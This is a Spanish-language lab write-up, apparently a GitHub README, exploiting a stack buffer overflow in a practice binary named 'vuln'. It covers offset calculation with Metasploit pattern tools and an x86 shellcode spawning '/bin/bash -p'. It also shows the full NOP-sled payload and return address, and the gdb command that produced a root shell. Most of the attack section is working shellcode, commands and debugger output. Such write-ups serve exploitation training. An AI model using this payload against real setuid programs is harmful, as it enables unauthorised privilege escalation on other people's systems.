# Vuln

explotaremos un BOF en el binario `vuln` asi que comenzamos corriendo el binario y observamos como se comporta

![image](https://github.com/user-attachments/assets/f1cb76b3-27d8-4c52-b620-6f45128d2241)

el binario comienza solicitando un parametro, luego hacemos una prueba a ver si desborda el buffer y parece que si ya que ocurre una `falla de segmentación`

### Chequeando Arquitectura y protecciones del binario

![image](https://github.com/user-attachments/assets/9e375d7a-697c-4074-a96b-225db10e3e9c)

arquitectura `x86` y solo cuenta con la proteccion `PIE`, podemos ejecutar shellcode (NX Desactivado); corremos el binario con un depurador (gdb)

# Calculo de offsed

para calcular el offset hacemos uso de estos 2 exploit de `metasploit`

```bash
1) /usr/share/metasploit-framework/tools/exploit/pattern_create.rb
2) /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
```

primero generamos la cadena que pasaremos al binario con el primer exploit

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
```

ahora se lo pasamos al binario (ya corriendo en el depurador)

![image](https://github.com/user-attachments/assets/9efedbff-1b41-4627-a96b-50c34762d482)

obtenemos el valor de eip, si queremos verificar:

![image](https://github.com/user-attachments/assets/0c20d4a8-40ff-4bf4-9811-dfe4742b1235)

valor de eip =`0x63413563`; se lo pasamos al segundo exploit de `metasploit`

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563        
[*] Exact match at offset 76
```

offset = 76; validamos si dicho valor es correcto:

![image](https://github.com/user-attachments/assets/b998af66-8d51-4995-ae56-ab152a3894c7)

comprobamos que si lo es, por lo que aqui podria intentar ejecutar una shellcode `/bin/bash -p`

```bash
shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
```

# Ejecucion de la shellcode

en este caso la shellcode es de 33 byte y el offset es de 76, asi que la cantidad de NOP's que se deben enviar es `offset - shellcode = 43 NOP's`

```ruby
offset = 76
NOP's  = b"\x90"*43
shellcode = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
```
ahora nos falta localizar la direccion de memoria a la que vamos a redirigir el programa, esta redireccion debe ser a los NOP's, por lo que buscaremos las direcciones de memeria
donde se escriben

```ruby
run $(python2 -c 'print(b"\x90"*43 + b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + b"C"*4)')
```

![image](https://github.com/user-attachments/assets/9f360731-7c4a-4ecb-98c1-5a1f5f7fe42f)

ahora chequeamos las direcciones de memoria buscando los NOP's `x909090`

```bash
x/200xw $esp
0xffffd610:	0x75762f73	0x90006e6c	0x90909090	0x90909090
0xffffd620:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd630:	0x90909090	0x90909090	0x90909090	0x90909090
```

![image](https://github.com/user-attachments/assets/8885a036-fd1f-4b61-989f-13ba89bdbd0e)

usaremos la primera direccion de memoria donde se registran los NOP's `0xffffd610` y sera esta direccion la que le asignemos a `eip`

datos
```ruby
offset = 76
NOP's  = b"\x90"*43
shellcode = b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
eip = b"\x10\xd6\xff\xff"
```

ya con toda la informacion intentamos entonces ejecutar la `shellcode`

```bash
run $(python2 -c 'print(b"\x90"*43 + b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + b"\x10\xd6\xff\xff")')
```
![image](https://github.com/user-attachments/assets/b398132f-18a0-41d1-9df4-aa8fbdeede2f)

en mi caso he recibido una shell como `root` porque lo he preparado para tal fin (haciendo que mi user pueda ejecutar como root el binario /bin/gdb) en caso de no ser esto configurado
igual debe funcionar pero no obteniendo una shell como root, si quito dicha configuracion obtengo la shell como mi mismo usuario

![image](https://github.com/user-attachments/assets/48380731-1185-473d-a0bc-52281b8936dc)

una observacion mas, es que la direccion de memoria que se le asigna a `eip` se debe ir testeando, si la primera direccion no funciona, entonces se prueba con la segunda (lo mas recomendado 
es asignarle una direccion intermedia)


